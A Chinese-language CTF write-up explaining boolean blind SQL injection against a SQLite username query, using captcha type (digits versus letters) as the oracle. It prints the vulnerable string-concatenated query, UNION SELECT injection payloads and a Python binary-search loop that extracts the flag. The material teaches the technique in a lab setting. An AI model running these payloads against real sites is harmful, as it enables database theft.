# 你先别急

## 题目简述

网站根据用户名查询数据库中的风险等级，再生成对应难度的验证码。低风险验证码几乎全是数字，高风险验证码全是字母。用户名被直接拼进 SQLite 查询，但接口不会返回查询结果或 SQL 错误，需要把验证码类型当作布尔盲注信道。

## 解题过程

### 确认注入点和侧信道

服务端执行的查询为：

```python
sql = f"select riskness from users where username='{username}'"
```

查询第一列能转成整数时，该整数就是验证码难度；查询无结果、报错或返回非整数时，`force_int` 会退回最高难度 9。难度 1 生成 9 位纯数字，难度 9 生成 9 位纯字母，因此两类图片很容易区分。

先用已知低风险用户验证条件真假：

```sql
Simple-1' AND 1=1 -- a
Simple-1' AND 1=2 -- a
```

第一条仍返回纯数字验证码，第二条返回纯字母验证码，说明用户名存在 SQL 注入。末尾 `-- a` 注释掉模板补上的单引号。

### 构造布尔查询

使用 `UNION SELECT 1` 可以在条件成立时强制返回风险等级 1：

```sql
a' UNION SELECT 1 WHERE (<布尔条件>) -- a
```

于是：

- 条件成立：查询返回 `1`，图片为纯数字；
- 条件不成立：没有结果，回退到 `9`，图片为纯字母。

可以先枚举 `sqlite_master`，确认存在表 `flag`，其中包含同名字段。随后用 `length` 求 flag 长度，再逐字符二分：

```sql
a' UNION SELECT 1
WHERE unicode(substr((SELECT flag FROM flag), 7, 1)) >= 109 -- a
```

这里在判断第 7 个字符的 Unicode 码点是否至少为 109。对常见 flag 字符集做二分，每个字符只需约 6 至 7 次请求。

下面是提取逻辑的核心框架；`is_digit_captcha` 可以人工判断，也可以用本地生成数据训练简单的 HOG/线性分类器：

```python
def oracle(condition):
    payload = f"a' UNION SELECT 1 WHERE ({condition}) -- a"
    votes = [is_digit_captcha(request_captcha(payload)) for _ in range(5)]
    return sum(votes) >= 3

length = first_false(lambda n: oracle(
    f"(SELECT length(flag) FROM flag) > {n}"
))

alphabet = "".join(chr(c) for c in range(32, 127))
answer = ""
for pos in range(1, length + 1):
    lo, hi = 0, len(alphabet) - 1
    while lo < hi:
        mid = (lo + hi + 1) // 2
        cond = (
            f"unicode(substr((SELECT flag FROM flag),{pos},1)) "
            f">= {ord(alphabet[mid])}"
        )
        if oracle(cond):
            lo = mid
        else:
            hi = mid - 1
    answer += alphabet[lo]
```

验证码分类存在误差，单次约 90% 的分类器应对同一条件重复请求并多数表决。人工做题时也无需识别具体字符，只要判断“全数字”还是“全字母”。

另一条可行路线是把耗时字符串运算放进条件分支，改做时间盲注；不过网络抖动会影响阈值，而验证码类型已经提供了更清晰的信号。

## 方法总结

盲注并不一定通过响应长度、状态码或延时回传。任何由查询结果控制的可观察差异都可以成为侧信道，本题就是验证码复杂度。分析这类接口时，应先建立“SQL 结果—业务分支—外部现象”的映射，再把它封装成稳定的布尔 oracle；机器学习只是提高图片分类自动化程度，并不是漏洞本身。
